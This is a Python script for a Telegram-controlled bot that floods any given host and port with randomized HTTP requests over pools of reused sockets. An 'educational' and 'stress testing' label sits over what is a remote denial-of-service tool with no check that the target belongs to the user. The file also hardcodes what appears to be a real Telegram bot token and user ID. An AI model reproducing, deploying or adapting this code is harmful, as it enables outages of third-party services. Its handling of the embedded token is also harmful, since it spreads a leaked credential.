#!/usr/bin/env python3
"""
Educational Purpose Only - Network Stress Testing Tool
Authorize through Telegram with proper credentials
"""

import os
import sys
import fcntl
import logging
import random
import socket
import string
import time
import telebot
from queue import Queue
from threading import Thread, Lock
from datetime import datetime, timedelta

# ======================
# CONFIGURATION SECTION
# ======================
API_TOKEN = "7233414815:AAHhlUfOAiD8SLJNRNWlY4SJ_PV3wZf-GhY"  # Your Telegram bot token
AUTHORIZED_USERS = [5421063181]  # Add your Telegram user ID
MAX_CONCURRENT_ATTACKS = 3
MAX_REQUESTS_PER_ATTACK = 10000
SOCKET_TIMEOUT = 3
MAX_THREADS = 250
COOLDOWN_PERIOD = 300  # 5 minutes between attacks per user

# ======================
# GLOBAL STATE
# ======================
attack_queue = Queue()
active_attacks = {}
user_cooldown = {}
stats = {
    'total_attacks': 0,
    'blocked_requests': 0,
    'completed_attacks': 0
}

# Initialize bot with enhanced security
try:
    bot = telebot.TeleBot(API_TOKEN)
except Exception as e:
    print(f"Failed to initialize bot: {str(e)}")
    sys.exit(1)

# ======================
# SECURITY FUNCTIONS
# ======================
def authorize_user(user_id):
    """Check if user is authorized and not in cooldown"""
    if user_id not in AUTHORIZED_USERS:
        return False, "Unauthorized access attempt logged"
    
    last_attack = user_cooldown.get(user_id)
    if last_attack and (datetime.now() - last_attack) < timedelta(seconds=COOLDOWN_PERIOD):
        remaining = COOLDOWN_PERIOD - (datetime.now() - last_attack).seconds
        return False, f"Cooldown active: Wait {remaining} seconds"
    
    return True, "Authorized"

# ======================
# ATTACK ENGINE
# ======================
class AttackManager:
    def __init__(self):
        self.lock = Lock()
        
    def generate_payload(self, host):
        """Create randomized HTTP payloads"""
        methods = ['GET', 'POST', 'HEAD', 'PUT']
        path = '/' + ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        headers = '\r\n'.join([
            f'Host: {host}',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection: keep-alive'
        ])
        return f"{random.choice(methods)} {path} HTTP/1.1\r\n{headers}\r\n\r\n".encode()

    def attack_worker(self, attack_id, target, port, duration):
        """Managed attack thread with resource limits"""
        start_time = time.time()
        try:
            ip = socket.gethostbyname(target)
        except socket.gaierror:
            return "DNS resolution failed"
        
        sock_pool = []
        try:
            # Create initial socket connections
            for _ in range(10):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(SOCKET_TIMEOUT)
                s.connect((ip, port))
                sock_pool.append(s)
            
            # Maintain attack for duration
            while time.time() - start_time < duration:
                for s in sock_pool[:]:  # Iterate copy for safe removal
                    try:
                        s.send(self.generate_payload(target))
                        # Rotate sockets periodically
                        if random.random() < 0.1:
                            s.close()
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(SOCKET_TIMEOUT)
                            new_s.connect((ip, port))
                            sock_pool.append(new_s)
                    except:
                        sock_pool.remove(s)
                        stats['blocked_requests'] += 1
                        
                # Maintain socket pool size
                while len(sock_pool) < 10:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(SOCKET_TIMEOUT)
                        s.connect((ip, port))
                        sock_pool.append(s)
                    except:
                        break
                        
        finally:
            for s in sock_pool:
                s.close()
            stats['completed_attacks'] += 1
            print(f"Attack {attack_id} completed: {int(time.time() - start_time)}s duration")

# ======================
# BOT HANDLERS
# ======================
@bot.message_handler(commands=['start', 'help'])
def send_help(message):
    help_text = """
    ⚠️ Educational Use Only ⚠️
    Commands:
    /attack <target> [port] [duration] - Start test
    /status - Show active tests
    /stop <target> - Stop test
    /stats - Show statistics
    """
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    try:
        # Authorization check
        auth, reason = authorize_user(message.from_user.id)
        if not auth:
            bot.reply_to(message, f"⚠️ {reason}")
            return
        
        # Parse arguments
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "Usage: /attack <target> [port=80] [duration=60]")
            return
            
        target = parts[1]
        port = int(parts[2]) if len(parts) > 2 else 80
        duration = min(int(parts[3]), 300) if len(parts) > 3 else 60  # Max 5 minutes
        
        # Input validation
        if port not in range(1, 65536):
            raise ValueError("Invalid port number")
        
        # Queue attack
        attack_id = f"{target}:{port}-{time.time()}"
        attack_queue.put((attack_id, target, port, duration))
        active_attacks[attack_id] = {
            'start': datetime.now(),
            'user': message.from_user.id,
            'target': target,
            'port': port
        }
        user_cooldown[message.from_user.id] = datetime.now()
        
        # Start attack in a separate thread
        Thread(target=manager.attack_worker, args=(attack_id, target, port, duration), daemon=True).start()
        
        bot.reply_to(message, f"🚦 Attack queued: {target}:{port} for {duration}s")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['status'])
def show_status(message):
    status = []
    for aid, attack in active_attacks.items():
        duration = datetime.now() - attack['start']
        status.append(
            f"🔴 {attack['target']}:{attack['port']} "
            f"({duration.seconds}s) by user {attack['user']}"
        )
    bot.reply_to(message, "\n".join(status) if status else "No active attacks")

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    try:
        target = message.text.split()[1]
        to_remove = [aid for aid, attack in active_attacks.items() 
                     if attack['target'] == target]
        for aid in to_remove:
            del active_attacks[aid]
        bot.reply_to(message, f"🛑 Stopped {len(to_remove)} attacks on {target}")
    except:
        bot.reply_to(message, "Usage: /stop <target>")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    stats_message = (
        f"Total Attacks: {stats['total_attacks']}\n"
        f"Blocked Requests: {stats['blocked_requests']}\n"
        f"Completed Attacks: {stats['completed_attacks']}"
    )
    bot.reply_to(message, stats_message)

# ======================
# MAIN EXECUTION
# ======================
if __name__ == "__main__":
    # Prevent multiple instances
    try:
        lock_file = open('bot.lock', 'w')
        fcntl.flock(lock_file, fcntl.LOCK_EX | fcntl.LOCK_NB)
    except IOError:
        print("Another instance is already running")
        sys.exit(1)
        
    # Configure logging
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )
    
    # Start bot
    try:
        bot.infinity_polling()
    finally:
        fcntl.flock(lock_file, fcntl.LOCK_UN)
        lock_file.close()
